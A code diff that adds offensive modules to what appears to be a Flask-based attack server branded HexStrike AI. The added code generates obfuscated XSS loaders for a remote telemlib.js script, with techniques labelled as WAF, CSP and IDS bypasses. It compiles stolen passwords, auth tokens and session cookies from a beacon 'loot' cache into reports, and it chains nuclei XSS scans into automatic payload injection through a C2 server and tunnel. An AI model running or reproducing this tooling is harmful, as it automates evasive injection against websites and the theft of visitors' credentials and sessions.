@@ -18675,6 +18675,775 @@ def autoinject_xss():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ============================================================================
+# PAYLOAD OBFUSCATOR — bypass WAF/CSP pattern matching on telemlib.js loaders
+# ============================================================================
+
+class PayloadObfuscator:
+    """Generates obfuscated JS loaders for telemlib.js to evade WAF signature
+    matching, CSP report-uri violations, and XSS filter string detection.
+
+    All techniques produce semantically equivalent code that loads the same
+    URL — only the syntactic surface changes.
+
+    Techniques
+    ----------
+    base64_eval     eval(atob('B64'))        — hides all code from static scan
+    fromcharcode    String.fromCharCode(...) — no string literals at all
+    hex_url         \\x hex-escaped URL       — avoids URL string detection
+    unicode_url     \\u unicode-escaped URL   — alternate string encoding
+    string_split    URL split into chunks    — breaks domain pattern matching
+    fetch_dynamic   fetch()+eval()           — alternative loading vector
+    """
+
+    # Canonical JS loader template — URL placeholder is {}
+    _LOADER = "var s=document.createElement('script');s.src='{}';document.head.appendChild(s);"
+
+    # ── helpers ──────────────────────────────────────────────────────────────
+
+    def _hex_encode(self, s: str) -> str:
+        """Return s as a JS \\x hex string."""
+        return "".join(f"\\x{ord(c):02x}" for c in s)
+
+    def _unicode_encode(self, s: str) -> str:
+        """Return s as a JS \\u unicode string."""
+        return "".join(f"\\u{ord(c):04x}" for c in s)
+
+    def _to_charcode_array(self, s: str) -> str:
+        """Return a comma-separated list of char codes."""
+        return ",".join(str(ord(c)) for c in s)
+
+    def _split_url(self, url: str, chunk: int = 6) -> List[str]:
+        """Split url into chunks for array-join obfuscation."""
+        return [url[i:i+chunk] for i in range(0, len(url), chunk)]
+
+    def _wrap_script_tag(self, js: str) -> str:
+        return f"<script>{js}</script>"
+
+    def _wrap_img_onerror(self, js: str) -> str:
+        # Collapse to single-quoted to fit inside the attribute
+        inner = js.replace('"', "'")
+        return f'<img src=x onerror="{inner}">'
+
+    # ── techniques ───────────────────────────────────────────────────────────
+
+    def base64_eval(self, telemlib_url: str) -> Dict[str, str]:
+        """Hide entire loader inside atob() — no plaintext code visible."""
+        import base64 as _b64
+        loader = self._LOADER.format(telemlib_url)
+        encoded = _b64.b64encode(loader.encode()).decode()
+        js = f"eval(atob('{encoded}'))"
+        return {
+            "js": js,
+            "script_tag": self._wrap_script_tag(js),
+            "img_onerror": self._wrap_img_onerror(js),
+            "note": "Full loader base64-encoded. No plaintext URL or code visible.",
+        }
+
+    def fromcharcode(self, telemlib_url: str) -> Dict[str, str]:
+        """Convert every character to its decimal char code — zero string literals."""
+        loader = self._LOADER.format(telemlib_url)
+        codes = self._to_charcode_array(loader)
+        js = f"eval(String.fromCharCode({codes}))"
+        return {
+            "js": js,
+            "script_tag": self._wrap_script_tag(js),
+            "img_onerror": self._wrap_img_onerror(js),
+            "note": "Loader expressed as char code array. No string literals remain.",
+        }
+
+    def hex_url(self, telemlib_url: str) -> Dict[str, str]:
+        """Hex-escape the URL string — breaks domain/path pattern matching."""
+        hex_url_str = self._hex_encode(telemlib_url)
+        js = f"var s=document.createElement('script');s.src='{hex_url_str}';document.head.appendChild(s);"
+        return {
+            "js": js,
+            "script_tag": self._wrap_script_tag(js),
+            "img_onerror": self._wrap_img_onerror(js),
+            "note": "URL hex-escaped (\\x). Domain/path undetectable as plain string.",
+        }
+
+    def unicode_url(self, telemlib_url: str) -> Dict[str, str]:
+        """Unicode-escape the URL string — alternate encoding to hex."""
+        uni_url_str = self._unicode_encode(telemlib_url)
+        js = f"var s=document.createElement('script');s.src='{uni_url_str}';document.head.appendChild(s);"
+        return {
+            "js": js,
+            "script_tag": self._wrap_script_tag(js),
+            "img_onerror": self._wrap_img_onerror(js),
+            "note": "URL unicode-escaped (\\u). Alternate to hex — breaks signature overlap.",
+        }
+
+    def string_split(self, telemlib_url: str) -> Dict[str, str]:
+        """Split URL into a joined array — defeats URL pattern matching."""
+        parts = self._split_url(telemlib_url)
+        parts_js = "['" + "','".join(parts) + "']"
+        js = (
+            f"var _u={parts_js}.join('');"
+            "var s=document.createElement('script');"
+            "s.src=_u;document.head.appendChild(s);"
+        )
+        return {
+            "js": js,
+            "script_tag": self._wrap_script_tag(js),
+            "img_onerror": self._wrap_img_onerror(js),
+            "note": f"URL split into {len(parts)} chunks — no contiguous URL string.",
+        }
+
+    def fetch_dynamic(self, telemlib_url: str) -> Dict[str, str]:
+        """Use fetch()+eval() as an alternate load vector — avoids createElement."""
+        hex_url_str = self._hex_encode(telemlib_url)
+        js = f"fetch('{hex_url_str}').then(function(r){{return r.text()}}).then(eval)"
+        return {
+            "js": js,
+            "script_tag": self._wrap_script_tag(js),
+            "img_onerror": self._wrap_img_onerror(js),
+            "note": "Uses fetch+eval instead of createElement. Bypasses createElement CSP nonces.",
+        }
+
+    # ── public API ────────────────────────────────────────────────────────────
+
+    TECHNIQUE_MAP = {
+        "base64_eval":   "base64_eval",
+        "fromcharcode":  "fromcharcode",
+        "hex_url":       "hex_url",
+        "unicode_url":   "unicode_url",
+        "string_split":  "string_split",
+        "fetch_dynamic": "fetch_dynamic",
+    }
+
+    def obfuscate(
+        self,
+        telemlib_url: str,
+        technique: str = "all",
+    ) -> Dict[str, Any]:
+        """Generate one or all obfuscated loader variants for telemlib_url."""
+        if not telemlib_url.startswith(("http://", "https://")):
+            telemlib_url = f"https://{telemlib_url}"
+
+        methods = {
+            "base64_eval":   self.base64_eval,
+            "fromcharcode":  self.fromcharcode,
+            "hex_url":       self.hex_url,
+            "unicode_url":   self.unicode_url,
+            "string_split":  self.string_split,
+            "fetch_dynamic": self.fetch_dynamic,
+        }
+
+        if technique == "all":
+            variants = {name: fn(telemlib_url) for name, fn in methods.items()}
+        elif technique in methods:
+            variants = {technique: methods[technique](telemlib_url)}
+        else:
+            return {
+                "success": False,
+                "error": f"Unknown technique '{technique}'. "
+                         f"Choose from: {', '.join(methods)} or 'all'",
+            }
+
+        return {
+            "success": True,
+            "telemlib_url": telemlib_url,
+            "technique": technique,
+            "variants": variants,
+            "bypass_notes": {
+                "waf":  "base64_eval / fromcharcode hide all plaintext",
+                "csp":  "fetch_dynamic avoids createElement nonce requirement",
+                "ids":  "string_split / hex_url / unicode_url break URL signatures",
+            },
+        }
+
+
+payload_obfuscator = PayloadObfuscator()
+
+
+@app.route("/api/tools/obfuscate/payload", methods=["POST"])
+def obfuscate_payload():
+    """Generate obfuscated JS loaders for a telemlib.js URL."""
+    try:
+        params = request.json or {}
+        telemlib_url = params.get("telemlib_url", "")
+        technique = params.get("technique", "all")
+
+        if not telemlib_url:
+            return jsonify({"error": "telemlib_url is required"}), 400
+
+        logger.info(f"🎭 Obfuscating payload [{technique}] for {telemlib_url}")
+        result = payload_obfuscator.obfuscate(telemlib_url, technique)
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 obfuscate/payload error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ============================================================================
+# ENGAGEMENT REPORTER — auto-generate report from beacon loot cache
+# ============================================================================
+
+class EngagementReporter:
+    """Compiles beacon_listener's cached loot into a structured engagement
+    report (Markdown or HTML).
+
+    Sections
+    --------
+    Executive Summary  — client count, loot volume, key findings
+    Credentials        — USERINPUT / FORMPOST events containing passwords
+    Auth Tokens        — XHRAPICALL / FETCHAPICALL auth headers / JWT
+    Session Cookies    — COOKIE events
+    URLs Visited       — URLVISITED timeline per client
+    Per-Client Detail  — full event timeline with raw data
+    """
+
+    # Field names that suggest a credential value
+    CRED_HINTS = frozenset([
+        "password", "passwd", "pass", "pwd", "secret", "token",
+        "api_key", "apikey", "credential", "auth", "pin", "passphrase",
+    ])
+
+    TOKEN_HINTS = frozenset([
+        "authorization", "x-auth-token", "x-api-key", "bearer",
+        "jwt", "access_token", "refresh_token", "id_token",
+    ])
+
+    # ── helpers ──────────────────────────────────────────────────────────────
+
+    def _extract_credentials(self, loot_by_type: Dict[str, List]) -> List[Dict]:
+        """Pull credential-like fields from USERINPUT and FORMPOST events."""
+        creds = []
+        for event_type in ("USERINPUT", "FORMPOST"):
+            for event in loot_by_type.get(event_type, []):
+                data = event.get("data") or {}
+                for key, val in data.items():
+                    if any(h in key.lower() for h in self.CRED_HINTS):
+                        creds.append({
+                            "type": event_type,
+                            "field": key,
+                            "value": str(val)[:200],
+                            "timestamp": event.get("timestamp", ""),
+                        })
+        return creds
+
+    def _extract_tokens(self, loot_by_type: Dict[str, List]) -> List[Dict]:
+        """Pull auth headers / JWT tokens from XHR and Fetch events."""
+        tokens = []
+        for event_type in ("XHRAPICALL", "FETCHAPICALL"):
+            for event in loot_by_type.get(event_type, []):
+                data = event.get("data") or {}
+                # Check headers dict if present
+                for key, val in data.items():
+                    if any(h in str(key).lower() for h in self.TOKEN_HINTS):
+                        tokens.append({
+                            "type": event_type,
+                            "header": key,
+                            "value": str(val)[:300],
+                            "timestamp": event.get("timestamp", ""),
+                        })
+        return tokens
+
+    def _extract_cookies(self, loot_by_type: Dict[str, List]) -> List[Dict]:
+        return [
+            {
+                "name": e.get("data", {}).get("cookieName", ""),
+                "value": str(e.get("data", {}).get("cookieValue", ""))[:200],
+                "timestamp": e.get("timestamp", ""),
+            }
+            for e in loot_by_type.get("COOKIE", [])
+            if e.get("data")
+        ]
+
+    def _extract_urls(self, loot_by_type: Dict[str, List]) -> List[str]:
+        return [
+            str(e.get("data") or "")
+            for e in loot_by_type.get("URLVISITED", [])
+            if e.get("data")
+        ]
+
+    # ── Markdown generation ───────────────────────────────────────────────────
+
+    def _md_table(self, headers: List[str], rows: List[List[str]]) -> str:
+        sep = "| " + " | ".join("---" for _ in headers) + " |"
+        header_row = "| " + " | ".join(headers) + " |"
+        data_rows = "\n".join(
+            "| " + " | ".join(str(c).replace("|", "\\|")[:80] for c in row) + " |"
+            for row in rows
+        )
+        return f"{header_row}\n{sep}\n{data_rows}"
+
+    def generate_markdown(
+        self,
+        engagement_name: str,
+        clients: List[Dict],
+        all_loot: Dict[str, Dict],
+    ) -> str:
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        total_loot = sum(d.get("loot_count", 0) for d in all_loot.values())
+
+        # Aggregate across all clients
+        all_creds, all_tokens, all_cookies, all_urls = [], [], [], []
+        for cid, loot_data in all_loot.items():
+            lbt = loot_data.get("loot_by_type", {})
+            all_creds.extend(self._extract_credentials(lbt))
+            all_tokens.extend(self._extract_tokens(lbt))
+            all_cookies.extend(self._extract_cookies(lbt))
+            all_urls.extend(self._extract_urls(lbt))
+
+        lines = [
+            f"# Engagement Report: {engagement_name}",
+            f"> **Generated:** {now}  ",
+            f"> **Total Clients:** {len(clients)}  |  "
+            f"**Total Loot Items:** {total_loot}  |  "
+            f"**Credentials Found:** {len(all_creds)}  |  "
+            f"**Tokens Found:** {len(all_tokens)}",
+            "",
+            "---",
+            "",
+            "## Executive Summary",
+            "",
+            self._md_table(
+                ["Metric", "Value"],
+                [
+                    ["Clients beaconed", str(len(clients))],
+                    ["Total loot events", str(total_loot)],
+                    ["Credentials captured", str(len(all_creds))],
+                    ["Auth tokens captured", str(len(all_tokens))],
+                    ["Session cookies", str(len(all_cookies))],
+                    ["URLs visited", str(len(all_urls))],
+                ],
+            ),
+            "",
+        ]
+
+        if all_creds:
+            lines += [
+                "## Credentials",
+                "",
+                self._md_table(
+                    ["Type", "Field", "Value", "Timestamp"],
+                    [[c["type"], c["field"], c["value"], c["timestamp"]] for c in all_creds],
+                ),
+                "",
+            ]
+
+        if all_tokens:
+            lines += [
+                "## Auth Tokens / API Keys",
+                "",
+                self._md_table(
+                    ["Type", "Header", "Value", "Timestamp"],
+                    [[t["type"], t["header"], t["value"], t["timestamp"]] for t in all_tokens],
+                ),
+                "",
+            ]
+
+        if all_cookies:
+            lines += [
+                "## Session Cookies",
+                "",
+                self._md_table(
+                    ["Name", "Value", "Timestamp"],
+                    [[c["name"], c["value"], c["timestamp"]] for c in all_cookies],
+                ),
+                "",
+            ]
+
+        if all_urls:
+            lines += [
+                "## URLs Visited",
+                "",
+                *[f"- `{u}`" for u in all_urls[:50]],
+                *(["*(truncated to 50 entries)*"] if len(all_urls) > 50 else []),
+                "",
+            ]
+
+        lines += ["## Per-Client Detail", ""]
+        for client in clients:
+            cid = str(client.get("id", ""))
+            loot_data = all_loot.get(cid, {})
+            lbt = loot_data.get("loot_by_type", {})
+            types_seen = list(lbt.keys())
+            lines += [
+                f"### Client {cid} — {client.get('ip', 'unknown')}",
+                f"- **Browser:** {client.get('browser', '?')}",
+                f"- **Platform:** {client.get('platform', '?')}",
+                f"- **First seen:** {client.get('firstSeen', '?')}",
+                f"- **Last seen:** {client.get('lastSeen', '?')}",
+                f"- **Loot types:** {', '.join(types_seen) or 'none'}",
+                f"- **Total events:** {loot_data.get('loot_count', 0)}",
+                "",
+            ]
+
+        lines += [
+            "---",
+            f"*Generated by HexStrike AI — {now}*",
+        ]
+        return "\n".join(lines)
+
+    # ── HTML generation ───────────────────────────────────────────────────────
+
+    def generate_html(
+        self,
+        engagement_name: str,
+        clients: List[Dict],
+        all_loot: Dict[str, Dict],
+    ) -> str:
+        md = self.generate_markdown(engagement_name, clients, all_loot)
+        # Convert markdown tables to HTML and wrap
+        rows = md.split("\n")
+        html_rows = []
+        for row in rows:
+            if row.startswith("# "):
+                html_rows.append(f"<h1>{row[2:]}</h1>")
+            elif row.startswith("## "):
+                html_rows.append(f"<h2>{row[3:]}</h2>")
+            elif row.startswith("### "):
+                html_rows.append(f"<h3>{row[4:]}</h3>")
+            elif row.startswith("- "):
+                html_rows.append(f"<li>{row[2:]}</li>")
+            elif row.startswith("> "):
+                html_rows.append(f"<blockquote>{row[2:]}</blockquote>")
+            elif row.startswith("| "):
+                cells = [c.strip() for c in row.strip().strip("|").split("|")]
+                td = "".join(f"<td>{c}</td>" for c in cells)
+                html_rows.append(f"<tr>{td}</tr>")
+            elif row.strip() == "---":
+                html_rows.append("<hr>")
+            elif row.strip() == "":
+                html_rows.append("<br>")
+            else:
+                html_rows.append(f"<p>{row}</p>")
+
+        body = "\n".join(html_rows)
+        return f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>{engagement_name} — HexStrike Report</title>
+<style>
+  body{{font-family:monospace;background:#0d0d0d;color:#e0e0e0;max-width:1100px;margin:40px auto;padding:20px}}
+  h1{{color:#ff4444;border-bottom:2px solid #ff4444;padding-bottom:8px}}
+  h2{{color:#ff6666;border-bottom:1px solid #333;padding-bottom:4px}}
+  h3{{color:#ff8888}}
+  table{{border-collapse:collapse;width:100%;margin:12px 0}}
+  td,th{{border:1px solid #333;padding:6px 10px;text-align:left;word-break:break-all}}
+  tr:first-child td{{background:#1a1a1a;color:#ff4444;font-weight:bold}}
+  tr:nth-child(even){{background:#111}}
+  blockquote{{border-left:3px solid #ff4444;margin:8px 0;padding:4px 12px;color:#aaa}}
+  hr{{border:none;border-top:1px solid #333;margin:20px 0}}
+  li{{margin:4px 0}}
+  p{{margin:4px 0}}
+  code{{background:#1a1a1a;padding:2px 6px;border-radius:3px;color:#ff8888}}
+</style>
+</head>
+<body>
+{body}
+</body>
+</html>"""
+
+    # ── main entry ────────────────────────────────────────────────────────────
+
+    def generate(
+        self,
+        engagement_name: str = "Engagement",
+        output_format: str = "markdown",
+    ) -> Dict[str, Any]:
+        """Pull from beacon_listener cache and generate report."""
+        client_data = beacon_listener.get_clients()
+        clients = client_data.get("clients", [])
+
+        if not clients:
+            return {
+                "success": False,
+                "error": "No clients in beacon cache. Run beacon_start first.",
+            }
+
+        # Collect loot per client
+        all_loot: Dict[str, Dict] = {}
+        for client in clients:
+            cid = str(client.get("id", ""))
+            all_loot[cid] = beacon_listener.get_loot(cid)
+
+        output_format = output_format.lower()
+        if output_format == "html":
+            report = self.generate_html(engagement_name, clients, all_loot)
+            ext = "html"
+        else:
+            report = self.generate_markdown(engagement_name, clients, all_loot)
+            ext = "md"
+
+        total_loot = sum(d.get("loot_count", 0) for d in all_loot.values())
+        return {
+            "success": True,
+            "engagement_name": engagement_name,
+            "format": output_format,
+            "extension": ext,
+            "client_count": len(clients),
+            "total_loot": total_loot,
+            "report": report,
+        }
+
+
+engagement_reporter = EngagementReporter()
+
+
+@app.route("/api/tools/report/engagement", methods=["POST"])
+def report_engagement():
+    """Generate an engagement report from the beacon loot cache."""
+    try:
+        params = request.json or {}
+        engagement_name = params.get("engagement_name", "HexStrike Engagement")
+        output_format = params.get("output_format", "markdown")
+        output_path = params.get("output_path", "")
+
+        logger.info(f"📋 Generating {output_format} engagement report: {engagement_name}")
+        result = engagement_reporter.generate(engagement_name, output_format)
+
+        if result.get("success") and output_path:
+            try:
+                abs_path = os.path.abspath(output_path)
+                with open(abs_path, "w", encoding="utf-8") as fh:
+                    fh.write(result["report"])
+                result["saved_to"] = abs_path
+                logger.info(f"💾 Report saved to {abs_path}")
+            except Exception as e:
+                result["save_error"] = str(e)
+
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 report/engagement error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ============================================================================
+# NUCLEI → XSS PIPELINE — parse nuclei output and auto-chain XSS delivery
+# ============================================================================
+
+class NucleiXSSPipeline:
+    """Runs nuclei with XSS-focused templates, parses findings, and
+    automatically delivers JS-Tap payloads to each discovered vector.
+
+    Flow
+    ----
+    1. Execute nuclei (via execute_command) with xss tags
+    2. Parse stdout for XSS-tagged findings using regex
+    3. Extract injection URL + vulnerable parameter from each finding
+    4. For each finding (up to max_chains), call the full injection chain:
+       jstap_manager → tunnel_manager → payload → xss_auto_injector
+    """
+
+    # Nuclei text output: [template-id] [protocol] [severity] URL [...]
+    _LINE_RE = re.compile(
+        r"\[([a-zA-Z0-9_:-]+)\]\s+\[(?:http|https|network)\]\s+"
+        r"\[(critical|high|medium|low|info)\]\s+(https?://\S+)",
+        re.IGNORECASE,
+    )
+
+    def _is_xss_finding(self, template_id: str) -> bool:
+        return "xss" in template_id.lower()
+
+    def _extract_param(self, url: str) -> str:
+        """Return the first query parameter name, or 'q' as default."""
+        parsed = urllib.parse.urlparse(url)
+        qs = urllib.parse.parse_qs(parsed.query)
+        return next(iter(qs), "q")
+
+    def _clean_url(self, url: str) -> str:
+        """Strip injected payload from the matched URL to get the base URL."""
+        # Nuclei often appends the matched payload; keep up to the param value
+        parsed = urllib.parse.urlparse(url)
+        # Rebuild with only the base path and params (strip fragment)
+        return urllib.parse.urlunparse(
+            (parsed.scheme, parsed.netloc, parsed.path, "", parsed.query, "")
+        )
+
+    def parse_findings(self, nuclei_stdout: str) -> List[Dict[str, Any]]:
+        """Parse nuclei stdout and return a list of XSS finding dicts."""
+        findings = []
+        seen_urls: set = set()
+        for line in nuclei_stdout.splitlines():
+            m = self._LINE_RE.search(line)
+            if not m:
+                continue
+            template_id, severity, matched_url = m.group(1), m.group(2), m.group(3)
+            if not self._is_xss_finding(template_id):
+                continue
+            base_url = self._clean_url(matched_url)
+            if base_url in seen_urls:
+                continue
+            seen_urls.add(base_url)
+            findings.append({
+                "template_id": template_id,
+                "severity": severity.lower(),
+                "matched_url": matched_url,
+                "target_url": base_url,
+                "param": self._extract_param(base_url),
+            })
+        return findings
+
+    def run(
+        self,
+        target: str,
+        tunnel_provider: str = "auto",
+        tunnel_auth_token: str = "",
+        jstap_port: int = 8444,
+        jstap_username: str = "",
+        jstap_password: str = "",
+        beacon_interval: int = 10,
+        payload_mode: str = "trap",
+        obfuscate: bool = False,
+        obfuscation_technique: str = "base64_eval",
+        dry_run: bool = False,
+        max_chains: int = 3,
+    ) -> Dict[str, Any]:
+        """Run nuclei XSS scan on target, then auto-chain each finding."""
+
+        # ── Step 1: nuclei scan ───────────────────────────────────────────────
+        logger.info(f"🔬 Running nuclei XSS scan on {target}")
+        nuclei_cmd = (
+            f"nuclei -u {target} -tags xss -severity critical,high,medium,low -silent"
+        )
+        nuclei_result = execute_command(nuclei_cmd)
+        stdout = nuclei_result.get("stdout", "")
+        findings = self.parse_findings(stdout)
+
+        result: Dict[str, Any] = {
+            "target": target,
+            "nuclei_exit_code": nuclei_result.get("exit_code"),
+            "findings_count": len(findings),
+            "xss_findings": findings,
+            "chains": [],
+        }
+
+        if not findings:
+            result["message"] = "No XSS findings detected by nuclei."
+            return result
+
+        if dry_run:
+            result["dry_run"] = True
+            result["message"] = (
+                f"Dry run: found {len(findings)} XSS vector(s). "
+                "Set dry_run=False to execute chains."
+            )
+            return result
+
+        # ── Step 2: Start shared C2 + tunnel once for all chains ─────────────
+        logger.info("🚀 Starting JS-Tap C2 for pipeline")
+        c2_result = jstap_manager.start(port=jstap_port, use_gunicorn=False)
+        if not c2_result.get("success") and "already running" not in c2_result.get("error", ""):
+            result["error"] = f"JS-Tap start failed: {c2_result.get('error')}"
+            return result
+
+        logger.info(f"🌐 Starting {tunnel_provider} tunnel")
+        tunnel_data: Dict[str, Any] = {
+            "local_port": jstap_port,
+            "provider": tunnel_provider,
+        }
+        if tunnel_auth_token:
+            tunnel_data["auth_token"] = tunnel_auth_token
+        tunnel_result = tunnel_manager.start(**tunnel_data)
+        public_url = tunnel_result.get("public_url", "")
+
+        if not public_url:
+            result["error"] = f"Tunnel failed: {tunnel_result.get('error')}"
+            return result
+
+        result["public_url"] = public_url
+        logger.info(f"✅ C2 + tunnel up: {public_url}")
+
+        # ── Step 3: Generate payload (obfuscated if requested) ────────────────
+        payload_result = jstap_manager.generate_payload(
+            server_url=public_url, mode=payload_mode
+        )
+        payloads = payload_result.get("payloads", {})
+        telemlib_url = payload_result.get("telemlib_url", f"{public_url}/telemlib.js")
+
+        if obfuscate:
+            obf_result = payload_obfuscator.obfuscate(telemlib_url, obfuscation_technique)
+            variant = obf_result.get("variants", {}).get(obfuscation_technique, {})
+            chosen_payload = variant.get("img_onerror", variant.get("js", ""))
+        else:
+            chosen_payload = (
+                payloads.get("img_onerror") or next(iter(payloads.values()), "")
+            )
+
+        result["payload_used"] = chosen_payload
+        result["obfuscated"] = obfuscate
+
+        # ── Step 4: Inject into each finding (up to max_chains) ───────────────
+        for finding in findings[:max_chains]:
+            logger.info(
+                f"💉 Injecting into [{finding['template_id']}] "
+                f"{finding['target_url']} (param: {finding['param']})"
+            )
+            inject_result = xss_auto_injector.inject(
+                target_url=finding["target_url"],
+                payload=chosen_payload,
+                injection_point="url_param",
+                param_name=finding["param"],
+                method="GET",
+                verify_ssl=False,
+            )
+            result["chains"].append({
+                "finding": finding,
+                "injection": inject_result,
+                "reflected": inject_result.get("payload_reflected", False),
+            })
+
+        # ── Step 5: Beacon listener ───────────────────────────────────────────
+        if jstap_username and jstap_password:
+            beacon_result = beacon_listener.start(
+                public_url, jstap_username, jstap_password, beacon_interval
+            )
+            result["beacon"] = beacon_result
+        else:
+            result["beacon"] = {"skipped": True}
+
+        confirmed = sum(1 for c in result["chains"] if c.get("reflected"))
+        result["confirmed_reflections"] = confirmed
+        result["next_steps"] = (
+            f"{confirmed}/{len(result['chains'])} injections reflected. "
+            f"Victims beacon to {public_url}. "
+            + (
+                "Use beacon_list_clients + beacon_get_loot to pull loot."
+                if jstap_username
+                else "Start beacon_start to monitor sessions."
+            )
+        )
+        return result
+
+
+nuclei_xss_pipeline = NucleiXSSPipeline()
+
+
+@app.route("/api/tools/pipeline/nuclei-xss", methods=["POST"])
+def pipeline_nuclei_xss():
+    """Run nuclei XSS scan, parse findings, and auto-deliver JS-Tap payloads."""
+    try:
+        params = request.json or {}
+        target = params.get("target", "")
+        if not target:
+            return jsonify({"error": "target is required"}), 400
+
+        logger.info(f"⛓️  Nuclei→XSS pipeline starting: {target}")
+        result = nuclei_xss_pipeline.run(
+            target=target,
+            tunnel_provider=params.get("tunnel_provider", "auto"),
+            tunnel_auth_token=params.get("tunnel_auth_token", ""),
+            jstap_port=int(params.get("jstap_port", 8444)),
+            jstap_username=params.get("jstap_username", ""),
+            jstap_password=params.get("jstap_password", ""),
+            beacon_interval=int(params.get("beacon_interval", 10)),
+            payload_mode=params.get("payload_mode", "trap"),
+            obfuscate=params.get("obfuscate", False),
+            obfuscation_technique=params.get("obfuscation_technique", "base64_eval"),
+            dry_run=params.get("dry_run", False),
+            max_chains=int(params.get("max_chains", 3)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 pipeline/nuclei-xss error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
